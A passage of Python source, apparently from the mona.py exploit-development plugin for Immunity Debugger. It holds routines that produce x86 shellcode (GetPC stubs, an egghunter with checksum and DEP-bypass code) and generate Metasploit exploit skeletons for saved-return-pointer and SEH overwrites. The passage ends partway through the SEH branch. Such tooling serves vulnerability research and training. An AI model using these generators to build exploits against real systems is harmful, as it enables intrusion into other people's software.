					arraytable.append(hexbyte)
					binarray += binbyte
				startval += 1
			imm.log("Dumping table to file")
			output = ""
			cnt = 0
			outputline = '"'
			totalbytes = len(arraytable)
			tablecnt = 0
			while tablecnt < totalbytes:
				if (cnt < bytesperline):
					outputline += "\\x" + arraytable[tablecnt]
				else:
					outputline += '"\n'
					cnt = 0
					output += outputline
					outputline = '"\\x' + arraytable[tablecnt]
				tablecnt += 1
				cnt += 1
			if (cnt-1) < bytesperline:
				outputline += '"\n'
			output += outputline
			
			global ignoremodules
			ignoremodules = True
			arrayfilename="bytearray.txt"
			objarrayfile = MnLog(arrayfilename)
			arrayfile = objarrayfile.reset()
			binfilename = arrayfile.replace("bytearray.txt","bytearray.bin")
			objarrayfile.write(output,arrayfile)
			ignoremodules = False
			imm.logLines(output)
			imm.log("")
			binfile = open(binfilename,"wb")
			binfile.write(binarray)
			binfile.close()
			imm.log("Done, wrote %d bytes to file %s" % (len(arraytable),arrayfile))
			imm.log("Binary output saved in %s" % binfilename)
			return
			
			
			
			
		#----- Read binary file, print 'nice' header -----#
		def procPrintHeader(args):
			filename = ""
			if "f" in args:
				if type(args["f"]).__name__.lower() != "bool":	
					filename = args["f"]
			if filename == "":
				imm.log("Missing argument -f <source filename>",highlight=1)
				return
			filename = filename.replace("'","").replace('"',"")
			content = ""
			try:		
				file = open(filename,"rb")
				content = file.read()
				file.close()
			except:
				imm.log("Unable to read file %s" % filename,highlight=1)
				return
			imm.log("Read %d bytes from %s" % (len(content),filename))	
			
			cnt = 0
			linecnt = 0	
			
			output = ""
			thisline = ""			
			
			max = len(content)
			
			
			while cnt < max:

				# first check for unicode
				if cnt < max-1:
					if linecnt == 0:
						thisline = "header = Rex::Text.to_unicode(\""
					else:
						thisline = "header << Rex::Text.to_unicode(\""
						
					thiscnt = cnt
					while cnt < max-1 and isAscii2(ord(content[cnt])) and ord(content[cnt+1]) == 0:
						if content[cnt] == "\\":
							thisline += "\\"
						if content[cnt] == "\"":
							thisline += "\\"
						thisline += content[cnt]
						cnt += 2
					if thiscnt != cnt:
						output += thisline + "\")" + "\n"
						linecnt += 1
						
						
				if linecnt == 0:
					thisline = "header = \""
				else:
					thisline = "header << \""
				thiscnt = cnt
				
				# ascii repetitions
				reps = 1
				startval = content[cnt]
				if isAscii(ord(content[cnt])):
					while cnt < max-1:
						if startval == content[cnt+1]:
							reps += 1
							cnt += 1	
						else:
							break
					if reps > 1:
						if startval == "\\":
							startval += "\\"
						if startval == "\"":
							startval = "\\" + "\""	
						output += thisline + startval + "\" * " + str(reps) + "\n"
						cnt += 1
						linecnt += 1
						continue
						
				if linecnt == 0:
					thisline = "header = \""
				else:
					thisline = "header << \""
				thiscnt = cnt
				
				# check for just ascii
				while cnt < max and isAscii2(ord(content[cnt])):
					if cnt < max-1 and ord(content[cnt+1]) == 0:
						break
					if content[cnt] == "\\":
						thisline += "\\"
					if content[cnt] == "\"":
						thisline += "\\"			
					thisline += content[cnt]
					cnt += 1
					
					
				if thiscnt != cnt:
					output += thisline + "\"" + "\n"
					linecnt += 1		
				
				#check others : repetitions
				if cnt < max:
					if linecnt == 0:
						thisline = "header = \""
					else:
						thisline = "header << \""
					thiscnt = cnt
					while cnt < max:
						if isAscii2(ord(content[cnt])):
							break
						if cnt < max-1 and isAscii2(ord(content[cnt])) and ord(content[cnt+1]) == 0:
							break
						#check repetitions
						reps = 1
						startval = ord(content[cnt])
						while cnt < max-1:
							if startval == ord(content[cnt+1]):
								reps += 1
								cnt += 1	
							else:
								break
						if reps > 1:
							if len(thisline) > 12:
								output += thisline + "\"" + "\n"
							if linecnt == 0:
								thisline = "header = \"\\x" + "%02x\" * %d" % (startval,reps)
							else:
								thisline = "header << \"\\x" + "%02x\" * %d" % (startval,reps)
							output += thisline + "\n"
							thisline = "header << \""
							linecnt += 1
						else:
							thisline += "\\x" + "%02x" % ord(content[cnt])	
						cnt += 1
					if thiscnt != cnt:
						if len(thisline) > 12:
							output += thisline + "\"" + "\n"
							linecnt += 1			

			global ignoremodules
			ignoremodules = True
			headerfilename="header.txt"
			objheaderfile = MnLog(headerfilename)
			headerfile = objheaderfile.reset()
			objheaderfile.write(output,headerfile)
			ignoremodules = False
			imm.logLines(output)
			imm.log("")			
			imm.log("Wrote header to %s" % headerfile)
			return
		
		#----- Update -----#
		
		def procUpdate(args):
			"""
			Function to update mona to the latest version
			
			Arguments : none
			
			Returns : new version of mona (if available)
			"""
			#dev or release ?
			tree = "release"
			if __VERSION__.find("dev") > -1:
				tree = "trunk"
				
			#maybe user override ?
			usertree = ""
			forcedupdate = False
			if "t" in args:
				if type(args["t"]).__name__.lower() != "bool":	
					usertree = args["t"].lower()
			if usertree != "":
				if usertree in ["trunk","release"]:
					imm.log("[+] Attempting forced update to %s" % usertree)
					tree = usertree
					forcedupdate = True
			updateproto = "https"
			if "http" in args:
				updateproto  = "http"
			#immunity version	
			imversion = __IMM__
			#url
			imm.setStatusBar("Running update process...")
			imm.updateLog()
			updateurl = updateproto + "://redmine.corelan.be/projects/mona/repository/raw/" + tree + "/" + imversion + "/mona.py"
			currentversion,currentrevision = getVersionInfo(inspect.stack()[0][1])
			u = ""
			try:
				u = urllib.urlretrieve(updateurl)
				newversion,newrevision = getVersionInfo(u[0])
				if newversion != "" and newrevision != "":
					imm.log("[+] Version compare :")
					imm.log("    Current Version : %s, Current Revision : %s" % (currentversion,currentrevision))
					imm.log("    Latest Version : %s, Latest Revision : %s" % (newversion,newrevision))
				else:
					imm.log("[-] Unable to check latest version (corrupted file ?), try again later",highlight=1)
					return
			except:
				imm.log("[-] Unable to check latest version (download error), run !mona update -http or try again later",highlight=1)
				return
			#check versions
			doupdate = False
			if newversion != "" and newrevision != "":
				if currentversion != newversion:
					doupdate = True
				else:
					if int(currentrevision) < int(newrevision):
						doupdate = True
						
			#update if needed
			if forcedupdate:
				doupdate = True
				imm.log("[+] Forcing update to user specified branch")
				
			if doupdate:
				if not forcedupdate:
					imm.log("[+] New version available",highlight=1)
					imm.log("    Updating to %s r%s" % (newversion,newrevision),highlight=1)
				else:
					imm.log("[+] Putting %s version in place" % tree) 
				try:
					shutil.copyfile(u[0],inspect.stack()[0][1])
					imm.log("    Done")					
				except:
					imm.log("    ** Unable to update mona.py",highlight=1)
				currentversion,currentrevision = getVersionInfo(inspect.stack()[0][1])
				imm.log("[+] Current version : %s r%s" % (currentversion,currentrevision))
			else:
				imm.log("[+] You are running the latest version")
			imm.setStatusBar("Done.")
			return
			
		#----- GetPC -----#
		def procgetPC(args):
			r32 = ""
			output = ""
			if "r" in args:
				if type(args["r"]).__name__.lower() != "bool":	
					r32 = args["r"].lower()
						  
			if r32 == "" or not "r" in args:
				imm.log("Missing argument -r <register>",highlight=1)
				return

			opcodes = {}
			opcodes["eax"] = "\\x58"
			opcodes["ecx"] = "\\x59"
			opcodes["edx"] = "\\x5a"
			opcodes["ebx"] = "\\x5b"				
			opcodes["esp"] = "\\x5c"
			opcodes["ebp"] = "\\x5d"
			opcodes["esi"] = "\\x5e"
			opcodes["edi"] = "\\x5f"

			calls = {}
			calls["eax"] = "\\xd0"
			calls["ecx"] = "\\xd1"
			calls["edx"] = "\\xd2"
			calls["ebx"] = "\\xd3"				
			calls["esp"] = "\\xd4"
			calls["ebp"] = "\\xd5"
			calls["esi"] = "\\xd6"
			calls["edi"] = "\\xd7"
			
			output  = "\n" + r32 + "|  jmp short back:\n\"\\xeb\\x03" + opcodes[r32] + "\\xff" + calls[r32] + "\\xe8\\xf8\\xff\\xff\\xff\"\n"
			output += r32 + "|  call + 4:\n\"\\xe8\\xff\\xff\\xff\\xff\\xc3" + opcodes[r32] + "\"\n"
			output += r32 + "|  fstenv:\n\"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4" + opcodes[r32] + "\"\n"
                        
			global ignoremodules
			ignoremodules = True
			getpcfilename="getpc.txt"
			objgetpcfile = MnLog(getpcfilename)
			getpcfile = objgetpcfile.reset()
			objgetpcfile.write(output,getpcfile)
			ignoremodules = False
			imm.logLines(output)
			imm.log("")			
			imm.log("Wrote to file %s" % getpcfile)
			return		

			
		#----- Egghunter -----#
		def procEgg(args):
			filename = ""
			egg = "w00t"
			usechecksum = False
			egg_size = 0
			checksumbyte = ""
			extratext = ""
			
			global silent
			oldsilent = silent
			silent = True			
			
			if "f" in args:
				if type(args["f"]).__name__.lower() != "bool":
					filename = args["f"]
			filename = filename.replace("'", "").replace("\"", "")					

			#Set egg
			if "t" in args:
				if type(args["t"]).__name__.lower() != "bool":
					egg = args["t"]

			if len(egg) != 4:
				egg = 'w00t'
			imm.log("[+] Egg set to %s" % egg)
			
			if "c" in args:
				if filename != "":
					usechecksum = True
					imm.log("[+] Hunter will include checksum routine")
				else:
					imm.log("Option -c only works in conjunction with -f <filename>",highlight=1)
					return
			
			startreg = ""
			if "startreg" in args:
				if isReg(args["startreg"]):
					startreg = args["startreg"].lower()
					imm.log("[+] Egg will start search at %s" % startreg)
			
					
			depmethods = ["virtualprotect","copy","copy_size"]
			depreg = "esi"
			depsize = 0
			freeregs = [ "ebx","ecx","ebp","esi" ]
			
			regsx = {}
			# 0 : mov xX
			# 1 : push xX
			# 2 : mov xL
			# 3 : mov xH
			#
			regsx["eax"] = ["\x66\xb8","\x66\x50","\xb0","\xb4"]
			regsx["ebx"] = ["\x66\xbb","\x66\x53","\xb3","\xb7"]
			regsx["ecx"] = ["\x66\xb9","\x66\x51","\xb1","\xb5"]
			regsx["edx"] = ["\x66\xba","\x66\x52","\xb2","\xb6"]
			regsx["esi"] = ["\x66\xbe","\x66\x56"]
			regsx["edi"] = ["\x66\xbf","\x66\x57"]
			regsx["ebp"] = ["\x66\xbd","\x66\x55"]
			regsx["esp"] = ["\x66\xbc","\x66\x54"]
			
			addreg = {}
			addreg["eax"] = "\x83\xc0"
			addreg["ebx"] = "\x83\xc3"			
			addreg["ecx"] = "\x83\xc1"
			addreg["edx"] = "\x83\xc2"
			addreg["esi"] = "\x83\xc6"
			addreg["edi"] = "\x83\xc7"
			addreg["ebp"] = "\x83\xc5"			
			addreg["esp"] = "\x83\xc4"
			
			depdest = ""
			depmethod = ""
			
			getpointer = ""
			getsize = ""
			getpc = ""
			
			jmppayload = "\xff\xe7"
			
			if "depmethod" in args:
				if args["depmethod"].lower() in depmethods:
					depmethod = args["depmethod"].lower()
					imm.log("[+] Hunter will include routine to bypass DEP on found shellcode")
					# other DEP related arguments ?
					# depreg
					# depdest
					# depsize
				if "depreg" in args:
					if isReg(args["depreg"]):
						depreg = args["depreg"].lower()
				if "depdest" in args:
					if isReg(args["depdest"]):
						depdest = args["depdest"].lower()
				if "depsize" in args:
					try:
						depsize = int(args["depsize"])
					except:
						imm.log(" ** Invalid depsize",highlight=1)
						return
			
			
			#read payload file
			data = ""
			if filename != "":
				try:
					f = open(filename, "rb")
					data = f.read()
					f.close()
					imm.log("[+] Read payload file (%d bytes)" % len(data))
				except:
					imm.log("Unable to read file %s" %filename, highlight=1)
					return

					
			#let's start		
			egghunter = ""
			
			#Basic version of egghunter
			imm.log("[+] Generating egghunter code")
			egghunter += (
				"\x66\x81\xca\xff\x0f"+	#or dx,0xfff
				"\x42"+					#INC EDX
				"\x52"					#push edx
				"\x6a\x02"				#push 2	(NtAccessCheckAndAuditAlarm syscall)
				"\x58"					#pop eax
				"\xcd\x2e"				#int 0x2e 
				"\x3c\x05"				#cmp al,5
				"\x5a"					#pop edx
				"\x74\xef"				#je "or dx,0xfff"
				"\xb8"+egg+				#mov eax, egg
				"\x8b\xfa"				#mov edi,edx
				"\xaf"					#scasd
				"\x75\xea"				#jne "inc edx"
				"\xaf"					#scasd
				"\x75\xe7"				#jne "inc edx"
			)
			
			if usechecksum:
				imm.log("[+] Generating checksum routine")
				extratext = "+ checksum routine"
				egg_size = ""
				if len(data) < 256:
					cmp_reg = "\x80\xf9"	#cmp cl,value
					egg_size = hex2bin("%x" % len(data))
					offset1 = "\xf7"
					offset2 = "\xd3"
				elif len(data) < 65536:
					cmp_reg = "\x66\x81\xf9"	#cmp cx,value
					#avoid nulls
					egg_size_normal = "%04X" % len(data)
					while egg_size_normal[0:2] == "00" or egg_size_normal[2:4] == "00":
						data += "\x90"
						egg_size_normal = "%04X" % len(data)
					egg_size = hex2bin(egg_size_normal[2:4]) + hex2bin(egg_size_normal[0:2])
					offset1 = "\xf5"
					offset2 = "\xd1"
				else:
					imm.log("Cannot use checksum code with this payload size (way too big)",highlight=1)
					return
					
				sum = 0
				for byte in data:
					sum += ord(byte)
				sumstr= toHex(sum)
				checksumbyte = sumstr[len(sumstr)-2:len(sumstr)]

				egghunter += (
					"\x51"						#push ecx
					"\x31\xc9"					#xor ecx,ecx
					"\x31\xc0"					#xor eax,eax
					"\x02\x04\x0f"				#add al,byte [edi+ecx]
					"\x41"+						#inc ecx
					cmp_reg + egg_size +    	#cmp cx/cl, value
					"\x75" + offset1 +			#jnz "add al,byte [edi+ecx]
					"\x3a\x04\x39" +			#cmp al,byte [edi+ecx]
					"\x59" +					#pop ecx
					"\x75" + offset2			#jnz "inc edx"
				)		

			#dep bypass ?
			if depmethod != "":
				imm.log("[+] Generating dep bypass routine")
			
				if not depreg in freeregs:
					getpointer += "mov " + freeregs[0] +"," + depreg + "#"
					depreg = freeregs[0]
				
				freeregs.remove(depreg)
				if depmethod == "copy" or depmethod == "copy_size":
					if depdest != "":
						if not depdest in freeregs:
							getpointer += "mov " + freeregs[0] + "," + depdest + "#"
							depdest = freeregs[0]
					else:
						getpc = "\xd9\xee"			# fldz
						getpc += "\xd9\x74\xe4\xf4"	# fstenv [esp-0c]
						depdest = freeregs[0]
						getpc += hex2bin(assemble("pop "+depdest))
					
					freeregs.remove(depdest)
				
				sizereg = freeregs[0]
				
				if depsize == 0:
					# set depsize to payload * 2 if we are using a file
					depsize = len(data) * 2
					if depmethod == "copy_size":
						depsize = len(data)
					
				if depsize == 0:
					imm.log("** Please specify a valid -depsize when you are not using -f **",highlight=1)
					return
				else:
					if depsize <= 127:
						#simply push it to the stack
						getsize = "\x6a" + hex2bin("\\x" + toHexByte(depsize))
					else:
						#can we do it with 16bit reg, no nulls ?
						if depsize <= 65535:
							sizeparam = toHex(depsize)[4:8]
							getsize = hex2bin(assemble("xor "+sizereg+","+sizereg))
							if not (sizeparam[0:2] == "00" or sizeparam[2:4] == "00"):
								#no nulls, hooray, write to xX
								getsize += regsx[sizereg][0]+hex2bin("\\x" + sizeparam[2:4] + "\\x" + sizeparam[0:2])
							else:
								# write the non null if we can
								if len(regsx[sizereg]) > 2:
									if not (sizeparam[0:2] == "00"):
										# write to xH
										getsize += regsx[sizereg][3] + hex2bin("\\x" + sizeparam[0:2])
									if not (sizeparam[2:4] == "00"):
										# write to xL
										getsize += regsx[sizereg][2] + hex2bin("\\x" + sizeparam[2:4])
								else:
									#we have to write the full value to sizereg
									blockcnt = 0
									vpsize = 0
									blocksize = depsize
									while blocksize >= 127:
										blocksize = blocksize / 2
										blockcnt += 1
									if blockcnt > 0:
										getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(blocksize))
										vpsize = blocksize
										depblockcnt = 0
										while depblockcnt < blockcnt:
											getsize += hex2bin(assemble("add "+sizereg+","+sizereg))
											vpsize += vpsize
											depblockcnt += 1
										delta = depsize - vpsize
										if delta > 0:
											getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(delta))
									else:
										getsize += addreg[sizereg] + hex2bin("\\x" + toHexByte(depsize))
								# finally push
							getsize += hex2bin(assemble("push "+ sizereg))
								
						else:
							imm.log("** Shellcode size (depsize) is too big",highlight=1)
							return
						
				#finish it off
				if depmethod == "virtualprotect":
					jmppayload = "\x54\x6a\x40"
					jmppayload += getsize
					jmppayload += hex2bin(assemble("#push edi#push edi#push "+depreg+"#ret"))
				elif depmethod == "copy":
					jmppayload = hex2bin(assemble("push edi\push "+depdest+"#push "+depdest+"#push "+depreg+"#mov edi,"+depdest+"#ret"))
				elif depmethod == "copy_size":
					jmppayload += getsize
					jmppayload += hex2bin(assemble("push edi#push "+depdest+"#push " + depdest + "#push "+depreg+"#mov edi,"+depdest+"#ret"))
				
		
			#jmp to payload
			egghunter += getpc
			egghunter += jmppayload
			
			startat = ""
			skip = ""
			
			#start at a certain reg ?
			if startreg != "":
				if startreg != "edx":
					startat = hex2bin(assemble("mov edx," + startreg))
				skip = "\xeb\x05"
			
			egghunter = skip + egghunter
			#pickup pointer for DEP bypass ?
			egghunter = hex2bin(assemble(getpointer)) + egghunter
			
			egghunter = startat + egghunter
			
			silent = oldsilent			
			
			#Convert binary to printable hex format
			egghunter_hex = toniceHex(egghunter.strip().replace(" ",""),16)
					
			global ignoremodules
			ignoremodules = True
			hunterfilename="egghunter.txt"
			objegghunterfile = MnLog(hunterfilename)
			egghunterfile = objegghunterfile.reset()						

			imm.log("[+] Egghunter %s (%d bytes): " % (extratext,len(egghunter.strip().replace(" ",""))))
			imm.logLines("%s" % egghunter_hex)
			
			objegghunterfile.write("Egghunter " + extratext + ", tag " + egg + " : ",egghunterfile)
			objegghunterfile.write(egghunter_hex,egghunterfile)			

			if filename == "":
				objegghunterfile.write("Put this tag in front of your shellcode : " + egg + egg,egghunterfile)
			else:
				imm.log("[+] Shellcode, with tag : ")			
				block = "\"" + egg + egg + "\"\n"
				cnt = 0
				flip = 1
				thisline = "\""
				while cnt < len(data):
					thisline += "\\x%s" % toHexByte(ord(data[cnt]))				
					if (flip == 32) or (cnt == len(data)-1):
						if cnt == len(data)-1 and checksumbyte != "":
							thisline += "\\x%s" % checksumbyte					
						thisline += "\""
						flip = 0
						block += thisline 
						block += "\n"
						thisline = "\""
					cnt += 1
					flip += 1
				imm.logLines(block)	
				objegghunterfile.write("\nShellcode, with tag :\n",egghunterfile)
				objegghunterfile.write(block,egghunterfile)	
		
			ignoremodules = False
					
			return
		
		#----- Find MSP ------ #
		
		def procFindMSP(args):
			distance = 0
			
			if "distance" in args:
				try:
					distance = int(args["distance"])
				except:
					distance = 0
			if distance < 0:
				imm.log("** Please provide a positive number as distance",highlight=1)
				return
			mspresults = {}
			mspresults = goFindMSP(distance,args)
			return
			
		def procSuggest(args):
			modulecriteria={}
			criteria={}
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			mspresults = {}
			mspresults = goFindMSP(100,args)
			isEIP = False
			isSEH = False
			isEIPUnicode = False
			isSEHUnicode = False
			initialoffsetSEH = 0
			initialoffsetEIP = 0
			shellcodesizeSEH = 0
			shellcodesizeEIP = 0
			nullsallowed = True
			
			global ignoremodules
			global noheader
			global ptr_to_get
			global silent
			global ptr_counter
			
			targetstr = ""
			exploitstr = ""
			originalauthor = ""
			url = ""
			
			#are we attached to an application ?
			if imm.getDebuggedPid() == 0:
				imm.log("** You don't seem to be attached to an application ! **",highlight=1)
				return	
			
			#create metasploit skeleton file
			exploitfilename="exploit.rb"
			objexploitfile = MnLog(exploitfilename)

			#ptr_to_get = 5				
			noheader = True
			ignoremodules = True
			exploitfile = objexploitfile.reset()			
			ignoremodules = False
			noheader = False
			
			imm.log(" ")
			imm.log("[+] Preparing payload...")
			imm.log(" ")			
			imm.updateLog()
			#what options do we have ?
			# 0 : pointer
			# 1 : offset
			# 2 : type
			
			if "registers" in mspresults:
				for reg in mspresults["registers"]:
					if reg.upper() == "EIP":
						isEIP = True
						eipval = mspresults["registers"][reg][0]
						ptrx = MnPointer(eipval)
						initialoffsetEIP = mspresults["registers"][reg][1]
						
			# 0 : pointer
			# 1 : offset
			# 2 : type
			# 3 : size
			if "seh" in mspresults:
				if len(mspresults["seh"]) > 0:
					isSEH = True
					for seh in mspresults["seh"]:
						if mspresults["seh"][seh][2] == "unicode":
							isSEHUnicode = True
						if not isSEHUnicode:
							initialoffsetSEH = mspresults["seh"][seh][1]
						else:
							initialoffsetSEH = mspresults["seh"][seh][1]
						shellcodesizeSEH = mspresults["seh"][seh][3]
						
			if isSEH:
				ignoremodules = True
				noheader = True
				exploitfilename_seh="exploit_seh.rb"
				objexploitfile_seh = MnLog(exploitfilename_seh)
				exploitfile_seh = objexploitfile_seh.reset()				
				ignoremodules = False
				noheader = False

			# start building exploit structure
			
			if not isEIP and not isSEH:
				imm.log(" ** Unable to suggest anything useful. You don't seem to control EIP or SEH ** ",highlight=1)
				return
			
			# let's ask a few questions 
			imm.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
			exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
			
			exploittype = imm.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()
			
			if not exploittype in exploittypes:
				imm.log("Boo - invalid exploit type, try again !",highlight=1)
				return
				
			portnr = 0
			extension = ""
			if exploittype.find("network") > -1:
				portnr = imm.inputBox("Remote port number : ")
				try:
					portnr = int(portnr)
				except:
					portnr = 0
			if exploittype.find("fileformat") > -1:
				extension = imm.inputBox("File extension :")
			
			
			extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
			
			if not extension.startswith("."):
				extension = "." + extension
				
			#get header if any
			#headerstuff = imm.inputBox("Header bytes (if any) :")
			
			#get footer if any
			#footerstuff = imm.inputBox("Header bytes (if any) :")
			
			url = imm.inputBox("Exploit-DB Advisory (ID or URL, empty = skip)")
			
			url = url.replace(" ","").lower()
			
			if url != "" and url.find("http") == -1:
				#id only
				url = "http://www.exploit-db.com/exploits/" + url
				
			imm.createLogWindow()
			imm.updateLog()
			
			badchars = ""
			if "badchars" in criteria:
				badchars = criteria["badchars"]
				
			if "nonull" in criteria:
				if not '\x00' in badchars:
					badchars += '\x00'
			
			skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,url,badchars)
			
			regsto = ""			

			if isEIP:
				imm.log("[+] Attempting to create payload for saved return pointer overwrite...")
				#where can we jump to - get the register that has the largest buffer size
				largestreg = ""
				largestsize = 0
				offsetreg = 0
				regptr = 0
				# register_to
				# 0 : pointer
				# 1 : offset
				# 2 : size
				# 3 : type
				eipcriteria = criteria
				modulecriteria["aslr"] = False
				modulecriteria["rebase"] = False
				modulecriteria["os"] = False
				jmp_pointers = {}
				jmppointer = 0
				instrinfo = ""

				if isEIPUnicode:
					eipcriteria["unicode"] = True
					eipcriteria["nonull"] = False
					
				if "registers_to" in mspresults:
					for reg in mspresults["registers_to"]:
						regsto += reg+","
						thissize = mspresults["registers_to"][reg][2]
						thisreg = reg
						thisoffset = mspresults["registers_to"][reg][1]
						thisregptr = mspresults["registers_to"][reg][0]
						if thisoffset < initialoffsetEIP:
							#fix the size, which will end at offset to EIP
							thissize = initialoffsetEIP - thisoffset
						if thissize > largestsize:								
							# can we find a jmp to that reg ?
							silent = True
							ptr_counter = 0
							ptr_to_get = 1								
							jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
							if len( jmp_pointers ) == 0:
								ptr_counter = 0
								ptr_to_get = 1								
								modulecriteria["os"] = True
								jmp_pointers = findJMP(modulecriteria,eipcriteria,reg.lower())
							modulecriteria["os"] = False
							if len( jmp_pointers ) > 0:
								largestsize = thissize 
								largestreg = thisreg
								offsetreg = thisoffset
								regptr = thisregptr
							silent = False
				regsto = regsto.rstrip(",")
				
				
				if largestreg == "":
					imm.log("    Payload is referenced by at least one register (%s), but I couldn't seem to find" % regsto,highlight=1)
					imm.log("    a way to jump to that register",highlight=1)
				else:
					#build exploit
					for ptrtype in jmp_pointers:
						jmppointer = jmp_pointers[ptrtype][0]
						instrinfo = ptrtype
						break
					ptrx = MnPointer(jmppointer)
					modname = ptrx.belongsTo()
					targetstr = "\t\t\t'Targets'\t\t=>\n"
					targetstr += "\t\t\t\t[\n"
					targetstr += "\t\t\t\t\t[ '<fill in the OS/app version here>',\n"
					targetstr += "\t\t\t\t\t\t{\n"
					if not isEIPUnicode:
						targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t0x" + toHex(jmppointer) + ",\n"
						targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t" + str(initialoffsetEIP) + "\n"
					else:
						origptr = toHex(jmppointer)
						#real unicode ?
						unicodeptr = ""
						transforminfo = ""
						if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":					
							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
						else:
							#transform
							transform = UnicodeTransformInfo(origptr)
							transformparts = transform.split(",")
							transformsubparts = transformparts[0].split(" ")
							origptr = transformsubparts[len(transformsubparts)-1]
							transforminfo = " #unicode transformed to 0x" + toHex(jmppointer)
							unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
						targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t" + unicodeptr + "," + transforminfo + "\n"
						targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t" + str(initialoffsetEIP) + "\t#Unicode\n"	
					
					targetstr += "\t\t\t\t\t\t}\n"
					targetstr += "\t\t\t\t\t], # " + instrinfo + " - " + modname + "\n"
					targetstr += "\t\t\t\t],\n"

					exploitstr = "\tdef exploit\n\n"
					if exploittype.find("network") > -1:
						if exploittype.find("tcp") > -1:
							exploitstr += "\n\t\tconnect\n\n"
						elif exploittype.find("udp") > -1:
							exploitstr += "\n\t\tconnect_udp\n\n"
					
					if initialoffsetEIP < offsetreg:
						# eip is before shellcode
						exploitstr += "\t\tbuffer =  rand_text(target['Offset'])\t\n"
						if not isEIPUnicode:
							exploitstr += "\t\tbuffer << [target.ret].pack('V')\t\n"
						else:
							exploitstr += "\t\tbuffer << target['Ret']\t#Unicode friendly jump\n\n"
						if offsetreg > initialoffsetEIP+2:
							if not isEIPUnicode:
								if (offsetreg - initialoffsetEIP - 4) > 0:
									exploitstr += "\t\tbuffer << rand_text(" + str(offsetreg - initialoffsetEIP - 4) + ")\t#junk\n"
							else:
								if ((offsetreg - initialoffsetEIP - 4)/2) > 0:
									exploitstr += "\t\tbuffer << rand_text(" + str((offsetreg - initialoffsetEIP - 4)/2) + ")\t#unicode junk\n"
						nops = 0
						if largestreg.upper() == "ESP":
							if not isEIPUnicode:
								exploitstr += "\t\tbuffer << make_nops(30)\n"
								nops = 30
								exploitstr += "\t\tbuffer << payload.encoded\t#max " + str(largestsize - nops) + " bytes\n"
						if isEIPUnicode:
							exploitstr += "\t\t# Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
							exploitstr += "\t\t# and then manually encode with unicode inside the exploit section :\n\n"
							exploitstr += "\t\tenc = framework.encoders.create('x86/unicode_mixed')\n\n"
							exploitstr += "\t\tregister_to_align_to = '" + largestreg.upper() + "'\n\n"
							if largestreg.upper() == "ESP":
								exploitstr += "\t\t# Note : since you are using ESP as bufferregister, make sure EBP points to a writeable address !\n"
								exploitstr += "\t\t# or patch the unicode decoder yourself\n"
							exploitstr += "\t\tenc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
							exploitstr += "\t\tunicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
							exploitstr += "\t\tbuffer << unicodepayload"
								
					else:
						# EIP -> jump to location before EIP
						beforeEIP = initialoffsetEIP - offsetreg
						if beforeEIP > 0:
							if offsetreg > 0:
								exploitstr += "\t\tbuffer = rand_text(" + str(offsetreg)+")\t#offset to " + largestreg+"\n"
								exploitstr += "\t\tbuffer << payload.encoded\t#max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
								exploitstr += "\t\tbuffer << rand_text(target['Offset'] - payload.encoded.length)\n"
								exploitstr += "\t\tbuffer << [target.ret].pack('V')\t\n"
							else:
								exploitstr += "\t\tbuffer = payload.encoded\t#max " + str(initialoffsetEIP - offsetreg) + " bytes\n"
								exploitstr += "\t\tbuffer << rand_text(target['Offset'] - payload.encoded.length)\n"
								exploitstr += "\t\tbuffer << [target.ret].pack('V')\t\n"

					if exploittype.find("network") > -1:
						exploitstr += "\n\t\tprint_status(\"Trying target #{target.name}...\")\n"
						if exploittype.find("tcp") > -1:
							exploitstr += "\t\tsock.put(buffer)\n"
							exploitstr += "\n\t\thandler\n"
						elif exploittype.find("udp") > -1:
							exploitstr += "\t\tudp_sock.put(buffer)\n"
							exploitstr += "\n\t\thandler(udp_sock)\n"
					if exploittype == "fileformat":
						exploitstr += "\n\t\tfile_create(buffer)\n\n"
					
					if exploittype.find("network") > -1:
						exploitstr += "\t\tdisconnect\n\n"
					exploitstr += "\tend\n"					
					imm.log("Metasploit 'Targets' section :")
					imm.log("------------------------------")
					imm.logLines(targetstr.replace("\t","    "))
					imm.log("")
					imm.log("Metasploit 'exploit' function :")
					imm.log("--------------------------------")
					imm.logLines(exploitstr.replace("\t","    "))
					
					#write skeleton
					objexploitfile.write(skeletonheader+"\n",exploitfile)
					objexploitfile.write(skeletoninit+"\n",exploitfile)
					objexploitfile.write(targetstr,exploitfile)
					objexploitfile.write(skeletoninit2,exploitfile)		
					objexploitfile.write(exploitstr,exploitfile)
					objexploitfile.write("end",exploitfile)					
					
			
			if isSEH:
				imm.log("[+] Attempting to create payload for SEH record overwrite...")
				sehcriteria = criteria
				modulecriteria["safeseh"] = False
				modulecriteria["rebase"] = False
				modulecriteria["aslr"] = False
				modulecriteria["os"] = False
				sehptr = 0
				instrinfo = ""
				if isSEHUnicode:
					sehcriteria["unicode"] = True
					if "nonull" in sehcriteria:
						sehcriteria.pop("nonull")
				modulecriteria["safeseh"] = False
				#get SEH pointers
				silent = True
				ptr_counter = 0
				ptr_to_get = 1					
				seh_pointers = findSEH(modulecriteria,sehcriteria)
				jmpback = False
				silent = False
				if not isSEHUnicode:
					#did we find a pointer ?
					if len(seh_pointers) == 0:
						#did we try to avoid nulls ?
						imm.log("[+] No non-null pointers found, trying 'jump back' layout now...")
